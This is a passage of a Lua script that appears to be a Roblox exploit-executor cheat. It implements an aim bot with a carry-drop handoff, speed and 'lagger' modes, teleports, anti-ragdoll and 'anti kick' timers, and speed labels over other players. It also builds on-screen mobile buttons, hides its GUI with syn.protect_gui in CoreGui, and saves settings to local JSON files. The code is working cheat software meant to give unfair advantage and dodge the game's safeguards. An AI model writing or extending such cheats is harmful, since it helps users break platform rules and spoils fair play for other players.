            if not bb then _ragCountdownRunning = false; return end
            local timeLeft = 2.5
            local step = 0.1
            while timeLeft > 0 and bb.Parent do
                _ragPunch(lbl, string.format("%.1f", timeLeft))
                task.wait(step)
                timeLeft = timeLeft - step
            end
            if bb and bb.Parent then
                _ragPunch(lbl, "READY!")
                task.wait(0.5)
                if bb and bb.Parent then bb:Destroy() end
            end
            _ragCountdownRunning = false
        end)
    end
    local _wasRagdolled = false
    RunService.Heartbeat:Connect(function()
        local char = LP.Character
        if not char then _wasRagdolled = false; return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then _wasRagdolled = false; return end
        local st = hum:GetState()
        local inRag = st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
        if inRag and not _wasRagdolled then
            _wasRagdolled = true
            _startRagCountdown()
        elseif not inRag then
            _wasRagdolled = false
        end
    end)
end

-- AIM BOT carry handoff:
-- when the internal or floating AIM BOT button is ON during carry animation
-- 71186871415348, disable AIM BOT first and run Pure's DROP BR. AIM BOT stays
-- disabled until the drop motion is finished, the carry animation is gone, and
-- any carry state detected at the start is cleared for stable consecutive frames.
-- If confirmation fails, DROP BR retries while AIM BOT remains disabled; only a
-- confirmed drop restores it. Anti Kick never cancels this cycle.
_G.PureDropThenAimCycleActive = false
_G.PureDropThenAimSafeModeAuthorized = false
do
    local CARRY_DROP_AIM_ANIM_ID = "71186871415348"
    local carryDropAimWasPlaying = false
    local carryDropAimLastTrigger = 0
    local carryDropAimSequenceActive = false

    local function isCarryDropAimAnimationPlaying()
        local character = LP.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
        if not animator then return false end
        for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
            local animation = track.Animation
            local animationId = animation and animation.AnimationId or ""
            if string.find(animationId, CARRY_DROP_AIM_ANIM_ID, 1, true) then return true end
        end
        return false
    end

    _G.PureCursedDropAimCarryAnimationPlaying = isCarryDropAimAnimationPlaying

    local function isPureAimButtonActive()
        if not __HH.batV2Enabled then return false end
        local getter = _G.PureCursedGetAimbot
        if type(getter) ~= "function" then return false end
        local ok, enabled = pcall(getter)
        return ok and enabled == true
    end

    -- Ragdoll destroys the carry animation PERMANENTLY: after a ragdoll ends
    -- (~3 seconds) the carry anim id does NOT come back, so the drop must
    -- never fire again for that brainrot. AntiRagdoll and the always-on speed
    -- loop both stamp _G.PureRagdollKilledCarry = true the moment ragdoll is
    -- detected (even while AIM BOT is off). The flag only resets when a
    -- brand-new carry animation starts (fresh pickup), via rising edge below.
    local function recentlyRagdolled()
        return _G.PureRagdollKilledCarry == true
    end

    local function stopCarryAnimNow()
        local character = LP.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
        if not animator then return end
        for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
            local animation = track.Animation
            local animationId = animation and animation.AnimationId or ""
            if string.find(animationId, CARRY_DROP_AIM_ANIM_ID, 1, true) then
                track:Stop(0)
            end
        end
    end

    local DROP_CONFIRM_STABLE_HEARTBEATS = 3
    local DROP_RETRY_INTERVAL = 0.75

    local function hasDetectedCarryState()
        local ok, carrying = pcall(__HH.isCarryingBrainrot, LP.Character)
        return ok and carrying == true
    end

    local function restorePureAimAfterConfirmedDrop(requireCarryStateClear)
        task.spawn(function()
            local stableClearHeartbeats = 0
            local lastDropAttemptAt = tick()
            while carryDropAimSequenceActive do
                RunService.Heartbeat:Wait()

                local dropMotionFinished = __HH.dropActive ~= true
                local carryAnimationCleared = not isCarryDropAimAnimationPlaying()
                local carryStateCleared = not requireCarryStateClear or not hasDetectedCarryState()

                if dropMotionFinished and carryAnimationCleared and carryStateCleared then
                    stableClearHeartbeats = stableClearHeartbeats + 1
                else
                    stableClearHeartbeats = 0
                end

                if stableClearHeartbeats >= DROP_CONFIRM_STABLE_HEARTBEATS then
                    -- Confirmed drop: finish the handoff and re-enable AIM BOT
                    -- automatically, mirroring the same enable path used by the
                    -- normal BAT V2 toggle (backend + visual + mobile button).
                    _G.PureDropThenAimSafeModeAuthorized = false
                    __HH.batV2Enabled = true
                    if _G.PureCursedSetAimbot then pcall(_G.PureCursedSetAimbot, true) end
                    if __HH.batV2SetVisual then __HH.batV2SetVisual(true) end
                    if __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(true) end
                    carryDropAimSequenceActive = false
                    _G.PureDropThenAimCycleActive = false
                    saveConfig()
                    return
                end

                -- Failed/not-yet-confirmed drop: keep AIM BOT OFF and retry DROP BR.
                -- Never retry on top of an active drop movement.
                local now = tick()
                if __HH.dropActive ~= true and now - lastDropAttemptAt >= DROP_RETRY_INTERVAL then
                    lastDropAttemptAt = now
                    runDrop()
                end
            end
        end)
    end

    local function triggerPureDropAimCycle()
        local now = tick()
        if carryDropAimSequenceActive then return end
        if now - carryDropAimLastTrigger < 0.75 then return end
        carryDropAimLastTrigger = now
        carryDropAimSequenceActive = true
        antiKickAimPending = false
        _G.PureDropThenAimCycleActive = true
        _G.PureDropThenAimSafeModeAuthorized = false

        -- Stop the backend and synchronize both Aim Bot controls before DROP BR.
        __HH.batV2Enabled = false
        if _G.PureCursedSetAimbot then pcall(_G.PureCursedSetAimbot, false) end
        if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
        if __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(false) end

        -- If a concrete carry state exists now, require that exact condition to
        -- clear too; otherwise the known carry animation is the confirmation signal.
        local requireCarryStateClear = hasDetectedCarryState()
        runDrop()
        restorePureAimAfterConfirmedDrop(requireCarryStateClear)
    end

    local carryAnimPrev = false

    RunService.Heartbeat:Connect(function()
        if carryDropAimSequenceActive then
            carryDropAimWasPlaying = isCarryDropAimAnimationPlaying()
            carryAnimPrev = carryDropAimWasPlaying
            return
        end

        local isPlaying = isCarryDropAimAnimationPlaying()

        -- Always-on rising edge: a brand-new carry animation just started
        -- (fresh brainrot pickup). This is the only thing that re-arms the
        -- drop after a ragdoll permanently destroyed the previous carry.
        if isPlaying and not carryAnimPrev then
            _G.PureRagdollKilledCarry = false
        end
        carryAnimPrev = isPlaying

        if not isPureAimButtonActive() then
            carryDropAimWasPlaying = false
            return
        end

        if recentlyRagdolled() then
            -- A ragdoll destroyed this carry for good (the anim id never comes
            -- back), so never drop it: just stop the anim and let AIM BOT run
            -- with no drop movement.
            stopCarryAnimNow()
            carryDropAimWasPlaying = false
            return
        end

        if isPlaying and not carryDropAimWasPlaying then triggerPureDropAimCycle() end
        carryDropAimWasPlaying = isPlaying
    end)
end

-- Anti Kick E01 carry timer (top-screen wide banner, pale ice blue).
do
    local e01Gui, e01Lbl, e01Active = nil, nil, false
    local E01_ANIM = "71186871415348"
    local function e01InCarry()
        local char=LP.Character; local hum=char and char:FindFirstChildOfClass("Humanoid"); local animator=hum and hum:FindFirstChildOfClass("Animator")
        if not animator then return false end
        for _,track in ipairs(animator:GetPlayingAnimationTracks()) do if track.Animation.AnimationId:find(E01_ANIM) then return true end end
        return false
    end
    local function clearE01()
        e01Active=false
        if e01Gui then e01Gui:Destroy(); e01Gui=nil end
        e01Lbl=nil
    end
    local function showE01()
        if e01Active then return end
        e01Active=true
        e01Gui=Instance.new("ScreenGui")
        e01Gui.Name="AntiKickE01"; e01Gui.ResetOnSpawn=false; e01Gui.IgnoreGuiInset=true
        e01Gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; e01Gui.DisplayOrder=15
        pcall(function() if syn and syn.protect_gui then syn.protect_gui(e01Gui) end end)
        if not pcall(function() e01Gui.Parent=game:GetService("CoreGui") end) then
            e01Gui.Parent=LP:WaitForChild("PlayerGui")
        end
        local bar=Instance.new("Frame",e01Gui)
        bar.AnchorPoint=Vector2.new(0.5,0)
        bar.Size=UDim2.new(1,-40,0,50); bar.Position=UDim2.new(0.5,0,0,70)
        bar.BackgroundColor3=Color3.fromRGB(7, 22, 36); bar.BackgroundTransparency=.5; bar.BorderSizePixel=0
        Instance.new("UICorner",bar).CornerRadius=UDim.new(0,10)
        local stroke=Instance.new("UIStroke",bar); stroke.Color=Color3.fromRGB(201, 238, 255); stroke.Thickness=1.5; stroke.Transparency=.3
        e01Lbl=Instance.new("TextLabel",bar)
        e01Lbl.Size=UDim2.new(1,-8,1,0); e01Lbl.Position=UDim2.new(0,4,0,0)
        e01Lbl.BackgroundTransparency=1; e01Lbl.Text="DON'T WIN OR E01"
        e01Lbl.Font=Enum.Font.GothamBlack; e01Lbl.TextSize=24
        e01Lbl.TextColor3=Color3.fromRGB(201, 238, 255); e01Lbl.ZIndex=5
        local began=tick()
        task.spawn(function()
            while e01Active do
                task.wait(.05)
                if not e01InCarry() then clearE01(); return end
                local left=math.max(0,3.1-(tick()-began))
                if left<=0 then clearE01(); return end
                if left < 1 then
                    e01Lbl.Text = "YOU CAN WIN"
                    e01Lbl.TextSize = 28
                    e01Lbl.TextColor3 = Color3.fromRGB(201, 238, 255)
                else
                    e01Lbl.Text = "DON'T WIN OR E01"
                    e01Lbl.TextSize = 24
                    e01Lbl.TextColor3 = Color3.fromRGB(201, 238, 255)
                end
            end
        end)
    end
    task.spawn(function() local was=false; while task.wait(.12) do local now=e01InCarry(); if now and not was then showE01() elseif not now and was then clearE01() end; was=now end end)
end

local playerSpeedLabels = {}

local function createPlayerSpeedLabel(plr)
    if plr == LP then return end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    if playerSpeedLabels[plr] then
        playerSpeedLabels[plr].gui:Destroy()
        playerSpeedLabels[plr] = nil
    end

    local speedGui = Instance.new("BillboardGui")
    speedGui.Name = "VynxSpeedLabel_Other"
    speedGui.Adornee = head
    speedGui.Size = UDim2.new(0, 160, 0, 28)
    speedGui.StudsOffset = Vector3.new(0, 2.8, 0)
    speedGui.AlwaysOnTop = true
    speedGui.Parent = char

    local speedLbl = Instance.new("TextLabel")
    speedLbl.Size = UDim2.new(1,0,1,0)
    speedLbl.BackgroundTransparency = 1
    speedLbl.Text = "Speed: 0"
    speedLbl.TextColor3 = Color3.fromRGB(201, 238, 255)
    speedLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    speedLbl.TextStrokeTransparency = 0
    speedLbl.Font = Enum.Font.GothamBold
    speedLbl.TextSize = 14
    speedLbl.TextScaled = true
    speedLbl.TextXAlignment = Enum.TextXAlignment.Center
    speedLbl.Parent = speedGui

    local conn
    conn = RunService.RenderStepped:Connect(function()
        if not char or not char.Parent then
            conn:Disconnect()
            return
        end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local spd = hum and hum.WalkSpeed or 0
        speedLbl.Text = string.format("Speed: %.0f", spd)
    end)

    playerSpeedLabels[plr] = {gui = speedGui, lbl = speedLbl, conn = conn}
end

Players.PlayerAdded:Connect(function(plr)
    if plr ~= LP then
        plr.CharacterAdded:Connect(function()
            task.wait(0.5)
            createPlayerSpeedLabel(plr)
        end)
    end
end)

Players.PlayerRemoving:Connect(function(plr)
    if playerSpeedLabels[plr] then
        playerSpeedLabels[plr].gui:Destroy()
        if playerSpeedLabels[plr].conn then playerSpeedLabels[plr].conn:Disconnect() end
        playerSpeedLabels[plr] = nil
    end
end)

local _cachedChar, _cachedHum, _cachedHrp = nil, nil, nil

LP.CharacterAdded:Connect(function(char)
    _cachedChar = nil; _cachedHum = nil; _cachedHrp = nil
    task.wait(0.3)
    _cachedChar = char
    _cachedHum = char:FindFirstChildOfClass("Humanoid")
    _cachedHrp = char:FindFirstChild("HumanoidRootPart")
    if _G.PureSpinBot and _G.PureSpinBot.enabled and _G.PureSpinBot.restart then
        _G.PureSpinBot.restart()
    end
    if __HH.medusaCounterEnabled or __HH.medusaResetEnabled then setupMedusa(char) end
    if __HH.batCounterEnabled then startBatCounter() end
    if __HH.unwalkEnabled then task.wait(0.5); __HH.startUnwalk() end
    if __HH.aceSelectedAnimationPack ~= "OFF" then
        task.wait(0.15)
        __HH.aceOriginalAnims = {}
        pcall(function() __HH.aceApplyAnimationPack(__HH.aceSelectedAnimationPack) end)
    end
    if __HH.antiRagdollEnabled then __HH.stopAntiRagdoll(); __HH.startAntiRagdoll() end
    __HH.startAntiDie()
    if __HH.autoResetOnDeath then __HH.setupDeathReset() end
    if __HH.tpLockEnabled then
        task.delay(0.2, function()
            if __HH.tpLockEnabled and startTPLock then startTPLock() end
        end)
    end
end)

__HH.UIS.InputBegan:Connect(function(input, gpe)
    if __HH._anyKeyListening then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if gpe or __HH.UIS:GetFocusedTextBox() then return end
    end
    if not __HH.isGamepadInput(input) then
        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    end
    if not __HH.isBindableInput(input) then return end
    local kc = input.KeyCode
    if __HH.kbMatch(__HH.KB.LaggerToggle, kc) then toggleLaggerMode(); saveConfig()
    elseif __HH.kbMatch(__HH.KB.SpeedToggle, kc) then toggleCarryMode(); saveConfig()
    elseif __HH.kbMatch(__HH.KB.DropBrainrot, kc) then runDrop()
    elseif __HH.kbMatch(__HH.KB.InstaReset, kc) then
        if tick() - __HH._lastKbSet > 0.5 then pcall(__HH.FrameReset.ResetPlayer) end
    elseif __HH.kbMatch(__HH.KB.TPFloor, kc) then __HH.tpToGround()
    elseif __HH.kbMatch(__HH.KB.AutoLeft, kc) then
        toggleAutoLeft()
    elseif __HH.kbMatch(__HH.KB.AutoRight, kc) then
        toggleAutoRight()
    elseif __HH.kbMatch(__HH.KB.TPLock, kc) then
        if __HH.batV2Enabled then toggleBatV2() end
        toggleTPLock(); saveConfig()
    elseif __HH.kbMatch(__HH.KB.GuiHide, kc) then
        if __HH.mainFrame then __HH.mainFrame.Visible = not __HH.mainFrame.Visible end
    elseif __HH.kbMatch(__HH.KB.BatV2Toggle, kc) then
        if not __HH.batV2Enabled and _G.AceSafeModeTryStart
            and not _G.AceSafeModeTryStart(false) then return end
        if __HH.tpLockEnabled then toggleTPLock() end
        toggleBatV2(); saveConfig()
    end
end)

local MOB_POS_FILE = "vynx_btnpos.json"
local DRAG_THRESHOLD = 15

local function loadBtnPositions()
    if not (isfile and isfile(MOB_POS_FILE)) then return {} end
    local ok, data = pcall(function() return __HH.HS:JSONDecode(readfile(MOB_POS_FILE)) end)
    if ok and type(data) == "table" then return data end
    return {}
end

local function saveBtnPositions()
    if not writefile then return end; if not __HH.mobGuiRef then return end
    local out = {}
    for _, child in ipairs(__HH.mobGuiRef:GetDescendants()) do
        if child:IsA("Frame") and child:GetAttribute("BtnKey") then
            local key = child:GetAttribute("BtnKey")
            out[key] = {xo = child.Position.X.Offset, yo = child.Position.Y.Offset}
        end
    end
    pcall(function() writefile(MOB_POS_FILE, __HH.HS:JSONEncode(out)) end)
end

local function destroyMobileButtons()
    if __HH.mobGuiRef then pcall(function() __HH.mobGuiRef:Destroy() end); __HH.mobGuiRef = nil end
    __HH.mobBtnRefs = {}
end

local function resetBtnPositions()
    pcall(function() if writefile then writefile(MOB_POS_FILE, "{}") end end)
    if __HH.mobileButtonsEnabled then buildMobileButtons() end
end

local function buildMobileButtons()
    destroyMobileButtons()
    if not __HH.mobileButtonsEnabled then return end
    local savedPositions = loadBtnPositions()
    local BTN_SIZE = math.floor(__HH.mobileButtonsSize * 0.65)
    local fontSize = math.max(9, math.floor(__HH.mobileButtonsSize * 0.13))
    local spacing = 20; local cols = 2
    local isRect = __HH.rectangularButtonsEnabled
    local btnW = BTN_SIZE; local btnH = BTN_SIZE
    if isRect then btnW = math.floor(BTN_SIZE*1.4); btnH = math.floor(BTN_SIZE*0.75); spacing = 16 end
    local viewport = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(800,600)
    local totalW = cols * btnW + (cols-1) * spacing
    local startX = viewport.X - totalW - 30; local startY = 30
    local buttonOrder = {
        {key="drop",         label="DROP BR",         toggle=false},
        {key="tpDown",       label="TP DOWN",         toggle=false},
        {key="batV2",        label="AIM BOT",          toggle=true},
        {key="tpLock",       label="TP BAT",     toggle=true},
        {key="lagger",       label="LAGGER",          toggle=true},
        {key="laggerCarry",  label="LAGGER CARRY",    toggle=true},
        {key="carrySpeed",   label="CARRY SPEED",     toggle=true},
        {key="instaReset",   label="INSTA RESET",     toggle=false},
        {key="autoLeft",     label="AUTO LEFT",       toggle=true},
        {key="autoRight",    label="AUTO RIGHT",      toggle=true},
    }
    local mobGui = Instance.new("ScreenGui")
    mobGui.Name = "VynxMobileButtons"; mobGui.ResetOnSpawn = false
    mobGui.DisplayOrder = 15; mobGui.IgnoreGuiInset = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(mobGui) end end)
    if not pcall(function() mobGui.Parent = game:GetService("CoreGui") end) then
        mobGui.Parent = LP:WaitForChild("PlayerGui")
    end
    __HH.mobGuiRef = mobGui

    -- only render buttons that are visible
    local visibleOrder = {}
    for _, def in ipairs(buttonOrder) do
        if __HH.buttonVisibility[def.key] ~= false then
            visibleOrder[#visibleOrder+1] = def
        end
    end
    for i, def in ipairs(visibleOrder) do
        local col = (i-1) % cols; local row = math.floor((i-1)/cols)
        local xPos = startX + col*(btnW+spacing); local yPos = startY + row*(btnH+spacing)
        local saved = savedPositions[def.key]
        local initX = saved and saved.xo or xPos; local initY = saved and saved.yo or yPos
        local frame = Instance.new("Frame", mobGui)
        frame.Name = "MobBtn_"..def.key
        frame.Size = UDim2.new(0,btnW,0,btnH)
        frame.Position = UDim2.new(0,initX,0,initY)
        frame.BackgroundColor3 = __HH.BTN_OFF; frame.BackgroundTransparency = 0
        frame.BorderSizePixel = 0; frame.Active = true; frame.ZIndex = 102
        frame:SetAttribute("BtnKey", def.key)
        local cornerRadius
        if __HH.circleButtonsEnabled then cornerRadius = UDim.new(1,0)
        elseif __HH.shapeButtonsEnabled then cornerRadius = UDim.new(0,4)
        elseif __HH.rectangularButtonsEnabled then cornerRadius = UDim.new(0,9)
        else cornerRadius = UDim.new(0, math.max(8, math.floor(math.min(btnW,btnH)*0.2))) end
        local uic = Instance.new("UICorner", frame); uic.CornerRadius = cornerRadius

        local fstroke = Instance.new("UIStroke", frame)
        fstroke.Name = "PureIceRunner"
        fstroke.Color = Color3.fromRGB(210, 242, 255)
        fstroke.Thickness = 2.4
        fstroke.Transparency = 0.04

        -- Protected so an executor with limited UIGradient support can never
        -- stop the floating buttons from being created.
        pcall(function()
            local iceMotion = Instance.new("UIGradient", fstroke)
            iceMotion.Name = "PureIceMotion"
            iceMotion.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(36, 74, 103)),
                ColorSequenceKeypoint.new(0.45, Color3.fromRGB(174, 226, 255)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(225, 246, 255)),
                ColorSequenceKeypoint.new(0.55, Color3.fromRGB(174, 226, 255)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(36, 74, 103))
            })
            iceMotion.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0.00, 0.94),
                NumberSequenceKeypoint.new(0.42, 0.84),
                NumberSequenceKeypoint.new(0.48, 0.08),
                NumberSequenceKeypoint.new(0.52, 0.08),
                NumberSequenceKeypoint.new(0.58, 0.84),
                NumberSequenceKeypoint.new(1.00, 0.94)
            })
            iceMotion.Rotation = 0
            TS:Create(iceMotion, TweenInfo.new(1.65, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation=360}):Play()
        end)

        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(1,0,1,0); btn.BackgroundTransparency = 1
        btn.Text = def.label; btn.TextColor3 = __HH.TEXT_OFF
        btn.Font = Enum.Font.GothamBold; btn.TextSize = fontSize
        btn.LineHeight = 1.1; btn.TextWrapped = true
        btn.AutoButtonColor = false; btn.ZIndex = 105
        local isOn = false
        local function setOn(v)
            isOn = v
            if v then
                frame:SetAttribute("BtnIsOn", true)
                local color = (def.key == "carrySpeed") and Color3.fromRGB(197, 237, 255) or __HH.BTN_ON
                TS:Create(frame, TweenInfo.new(0.12,Enum.EasingStyle.Quad), {BackgroundColor3 = color}):Play()
                TS:Create(fstroke, TweenInfo.new(0.12), {Color=Color3.fromRGB(210, 242, 255), Thickness=2.8, Transparency=0.01}):Play()
                TS:Create(btn, TweenInfo.new(0.12), {TextColor3 = __HH.TEXT_ON}):Play()
            else
                frame:SetAttribute("BtnIsOn", false)
                TS:Create(frame, TweenInfo.new(0.12,Enum.EasingStyle.Quad), {BackgroundColor3 = __HH.BTN_OFF}):Play()
                TS:Create(fstroke, TweenInfo.new(0.12), {Color=Color3.fromRGB(210, 242, 255), Thickness=2.4, Transparency=0.04}):Play()
                TS:Create(btn, TweenInfo.new(0.12), {TextColor3 = __HH.TEXT_OFF}):Play()
            end
        end
        __HH.mobBtnRefs[def.key] = setOn
        local dragData = {start=nil,startPos=nil,moved=false,down=false}
        btn.InputBegan:Connect(function(input)
            if __HH.uiLocked or not __HH.perButtonDragEnabled then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragData.moved=false; dragData.down=true
                dragData.start=input.Position; dragData.startPos=frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragData.down=false
                        if dragData.moved then pcall(saveBtnPositions) end
                    end
                end)
            end
        end)
        btn.InputChanged:Connect(function(input)
            if dragData.down and not __HH.uiLocked and __HH.perButtonDragEnabled and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local delta = input.Position - dragData.start
                if delta.Magnitude > DRAG_THRESHOLD then dragData.moved = true end
                if dragData.moved then
                    frame.Position = UDim2.new(dragData.startPos.X.Scale, dragData.startPos.X.Offset+delta.X, dragData.startPos.Y.Scale, dragData.startPos.Y.Offset+delta.Y)
                end
            end
        end)
        local function flashWhite()
            TS:Create(frame, TweenInfo.new(0.06), {BackgroundColor3=Color3.fromRGB(201, 238, 255)}):Play()
            TS:Create(btn, TweenInfo.new(0.06), {TextColor3=Color3.fromRGB(201, 238, 255)}):Play()
            task.delay(0.15, function()
                if isOn then
                    local color = (def.key == "carrySpeed") and Color3.fromRGB(197, 237, 255) or __HH.BTN_ON
                    TS:Create(frame, TweenInfo.new(0.12), {BackgroundColor3=color}):Play()
                    TS:Create(btn, TweenInfo.new(0.12), {TextColor3=__HH.TEXT_ON}):Play()
                else
                    TS:Create(frame, TweenInfo.new(0.12), {BackgroundColor3=__HH.BTN_OFF}):Play()
                    TS:Create(btn, TweenInfo.new(0.12), {TextColor3=__HH.TEXT_OFF}):Play()
                end
            end)
        end
        btn.MouseButton1Click:Connect(function()
            if dragData.moved then dragData.moved=false; return end
            flashWhite()
            if def.key == "tpLock" then
                if __HH.batV2Enabled then toggleBatV2() end
                toggleTPLock(); setOn(__HH.tpLockEnabled); saveConfig(); return
            end
            if def.key == "batV2" then
                if not __HH.batV2Enabled and _G.AceSafeModeTryStart
                    and not _G.AceSafeModeTryStart(true) then
                    setOn(false); saveConfig(); return
                end
                if __HH.tpLockEnabled then toggleTPLock() end
                toggleBatV2(); setOn(__HH.batV2Enabled)
                saveConfig(); return
            end
            if def.key == "carrySpeed" then
                toggleCarryMode(); setOn(carrySpeedActive)
                if __HH.mobBtnRefs.lagger then __HH.mobBtnRefs.lagger(laggerModeEnabled) end
                if __HH.mobBtnRefs.laggerCarry then __HH.mobBtnRefs.laggerCarry(laggerCarryToggled) end
                saveConfig(); return
            end
            if def.key == "lagger" then
                toggleLaggerMode(); setOn(laggerModeEnabled)
                if __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
                if __HH.mobBtnRefs.laggerCarry then __HH.mobBtnRefs.laggerCarry(laggerCarryToggled) end
                saveConfig(); return
            end
            if def.key == "laggerCarry" then
                toggleLaggerCarryMode(); setOn(laggerCarryToggled)
                if __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
                if __HH.mobBtnRefs.lagger then __HH.mobBtnRefs.lagger(laggerModeEnabled) end
                saveConfig(); return
            end
            if def.key == "drop" then runDrop(); return end
            if def.key == "tpDown" then __HH.tpToGround(); return end
            if def.key == "instaReset" then __HH.FrameReset.ResetPlayer(); return end
            if def.key == "autoLeft" then toggleAutoLeft(); return end
            if def.key == "autoRight" then toggleAutoRight(); return end
        end)
    end
    
    if __HH.mobBtnRefs.tpLock then __HH.mobBtnRefs.tpLock(__HH.tpLockEnabled) end
    if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(autoLeftEnabled) end
    if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(autoRightEnabled) end
    if __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(__HH.batV2Enabled) end
    if __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
    if __HH.mobBtnRefs.lagger then __HH.mobBtnRefs.lagger(laggerModeEnabled) end
    if __HH.mobBtnRefs.laggerCarry then __HH.mobBtnRefs.laggerCarry(laggerCarryToggled) end
end

-- loadConfig(externalCfg) applies a settings table either read from disk or
-- passed in directly (used by "Load Config" to restore a pasted code).
-- On a brand-new install (no VynxPC.json yet, or a corrupt one) it writes an
-- initial config immediately so auto-save is active from the very first run
-- instead of waiting for the user to change a setting first.
loadConfig = function(externalCfg)
    local cfg = externalCfg
    if not cfg then
        if not (isfile and isfile("VynxPC.json")) then
            saveConfig()
            return
        end
        local ok, decoded = pcall(function() return __HH.HS:JSONDecode(readfile("VynxPC.json")) end)
        if not ok or type(decoded) ~= "table" then
            saveConfig()
            return
        end
        cfg = decoded
    end
    if cfg.normalSpeed then NS = cfg.normalSpeed end
    if cfg.carrySpeed then CS = cfg.carrySpeed end
    if cfg.laggerSpeed then LAGGER_SPEED = cfg.laggerSpeed end
    if cfg.laggerCarrySpeed then LAGGER_CARRY_SPEED = cfg.laggerCarrySpeed end
    if cfg.aimbotV1Speed then aimbotV1Speed = cfg.aimbotV1Speed end
    if cfg.autoCarrySpeedEnabled ~= nil then autoCarrySpeedEnabled = cfg.autoCarrySpeedEnabled end
    if _G.Round3SpeedBooster then
        if cfg.r3Enabled ~= nil then
            _G.Round3SpeedBooster.setEnabled(cfg.r3Enabled == true)
        end
        if cfg.r3NormalSpeed then _G.Round3SpeedBooster.setNormalSpeed(cfg.r3NormalSpeed) end
        if cfg.r3CarrySpeed then _G.Round3SpeedBooster.setCarrySpeed(cfg.r3CarrySpeed) end
        if cfg.r3ForceCarry ~= nil and _G.Round3SpeedBooster.setForceCarry then
            _G.Round3SpeedBooster.setForceCarry(cfg.r3ForceCarry == true)
        end
    end
    if cfg.autoTPHeight then __HH.autoTPHeight = cfg.autoTPHeight end
    if cfg.autoJumpBrainrot ~= nil then __HH.autoJumpBrainrot = cfg.autoJumpBrainrot end
    if cfg.floatHeight then __HH.floatHeight = math.clamp(tonumber(cfg.floatHeight) or 6, 0, 200) end
    if cfg.floatEnabled ~= nil then __HH.floatEnabled = cfg.floatEnabled end
    if cfg.mobileButtonsSize then __HH.mobileButtonsSize = cfg.mobileButtonsSize end
    if cfg.antiRagdoll ~= nil then __HH.antiRagdollEnabled = cfg.antiRagdoll end
    if cfg.infiniteJump ~= nil then __HH.infJumpEnabled = cfg.infiniteJump end
    if cfg.medusaCounter ~= nil then __HH.medusaCounterEnabled = cfg.medusaCounter end
    if cfg.medusaReset ~= nil then __HH.medusaResetEnabled = cfg.medusaReset end
    if cfg.batCounter ~= nil then __HH.batCounterEnabled = cfg.batCounter end
    if cfg.carryMode ~= nil then carrySpeedActive = cfg.carryMode; speedMode = cfg.carryMode end
    if cfg.laggerMode ~= nil then laggerModeEnabled = cfg.laggerMode end
    if cfg.laggerCarryMode ~= nil then laggerCarryToggled = cfg.laggerCarryMode end
    if cfg.tpLockEnabled ~= nil then __HH.tpLockEnabled = cfg.tpLockEnabled end
    if cfg.autoSwing ~= nil then autoSwingEnabled = cfg.autoSwing end
    if cfg.mirrorTPDownEnabled ~= nil and _G.PureMirrorTPDown
    and _G.PureMirrorTPDown.setEnabled then
        _G.PureMirrorTPDown.setEnabled(cfg.mirrorTPDownEnabled)
    end
    if _G.PureBatSpam and cfg.batSpamEnabled ~= nil
    and _G.PureBatSpam.setEnabled then
        _G.PureBatSpam.setEnabled(cfg.batSpamEnabled)
    end
    if cfg.spinBotEnabled ~= nil and _G.PureSpinBot then _G.PureSpinBot.enabled = cfg.spinBotEnabled end
    if cfg.unwalkEnabled ~= nil then __HH.unwalkEnabled = cfg.unwalkEnabled end
    if cfg.antiLag ~= nil then __HH.antiLagEnabled = cfg.antiLag end
    if cfg.stretchRez ~= nil then __HH.stretchRezEnabled = cfg.stretchRez end
    if cfg.autoTPEnabled ~= nil then __HH.autoTPEnabled = cfg.autoTPEnabled end
    if cfg.guiTransparencyEnabled ~= nil then __HH.guiTransparencyEnabled = cfg.guiTransparencyEnabled end
    if cfg.mobileButtonsEnabled ~= nil then __HH.mobileButtonsEnabled = cfg.mobileButtonsEnabled end
    if cfg.circleButtonsEnabled ~= nil then __HH.circleButtonsEnabled = cfg.circleButtonsEnabled end
    if cfg.shapeButtonsEnabled ~= nil then __HH.shapeButtonsEnabled = cfg.shapeButtonsEnabled end
    if cfg.rectangularButtonsEnabled ~= nil then __HH.rectangularButtonsEnabled = cfg.rectangularButtonsEnabled end
    if cfg.antiDie ~= nil then __HH.antiDieEnabled = cfg.antiDie end
    if cfg.autoResetOnDeath ~= nil then __HH.autoResetOnDeath = cfg.autoResetOnDeath end
